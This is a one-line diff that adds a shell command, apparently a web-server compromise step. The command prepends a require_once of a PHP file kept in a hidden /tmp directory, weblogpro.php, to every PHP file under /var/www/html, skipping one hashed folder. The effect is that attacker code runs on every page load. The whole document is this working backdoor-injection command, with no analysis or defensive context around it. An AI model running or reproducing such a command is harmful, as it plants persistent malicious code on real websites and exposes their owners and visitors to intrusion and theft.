@@ -1,0 +1,1 @@
+find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i<?php require_once("/tmp/33253f64133730fabaa52a487ff98740/weblogpro.php");?>'
